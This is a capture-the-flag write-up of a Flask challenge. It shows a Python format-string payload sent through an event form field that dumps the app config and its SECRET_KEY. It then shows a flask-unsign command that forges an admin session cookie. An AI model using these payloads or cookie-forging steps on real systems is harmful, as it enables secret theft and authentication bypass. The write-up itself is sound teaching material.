# events

This challenge has some basic functions: register/login, added events(Name or Address), Admin Panel.

Our goal is to login as admin to view the admin panel.

In the beginning, we tried to decrypt the `user` cookie.

The cookie consists of three parts: data, timestamp, signature.

e.g. `Inp4YyI.XPZfEQ.Mr7NJDYuYIF6sf87wTcKCYuBBVc`.

We can use the following script to decrypt data and timestamp:

```python
from itsdangerous import base64_decode

s = "ImFzZCI.XPVouA.bToZpDkYXf5CMWcolC-CWgdaDdU"
data, timestamp,secret = s.split('.')

print(base64_decode(data))
print(int.from_bytes(base64_decode(timestamp),byteorder='big'))
```

But we don't have any secret key, so we can't sign the cookie.

Then I found that someone use username:`asd` and password:`asd` to try some python format string attack:

![](https://github.com/w181496/CTF/raw/master/fbctf2019/events/asd.png)

When I refreshed this page, the addresses of the result changed too.

So I know there is a format string vulnerability in the added event function! Thank you `asd:asd`.

After fuzzing, I found the vulnerability is in the `event_important` argument:

`event_name=a&event_address=a&event_important=__dict__`

The response of this payload is: 

`{'_sa_instance_state': <sqlalchemy.orm.state.InstanceState object at 0x7fb2c5ba2588>, 'fmt': '{0.__dict__}', 'show': '__dict__', 'name': 'a', 'owner_id': 67, 'address': 'a', 'id': 5335}`

OK. Let's try to find some useful information.

After that, I found the config of this flask app:

`event_important=__class__.__init__.__globals__[app].config`

=>

`
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'events_sesh_cookie', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:///my.db', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}>
`

It contains the secret key: `'SECRET_KEY': 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'`

We use `flask-unsign` to sign flask cookie.

![](https://github.com/w181496/CTF/raw/master/fbctf2019/events/colab.png)

`flask-unsign --secret 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y' --sign --cookie "admin"`

=> `ImFkbWluIg.XPSrLA.NdkV5Vsk-a5gDFlll1JcU2SumDI`

Replace the `user` cookie with this value, and then get the flag!

![](https://github.com/w181496/CTF/raw/master/fbctf2019/events/admin.png)

flag: `fb{e@t_aLL_th0s3_c0oKie5}`


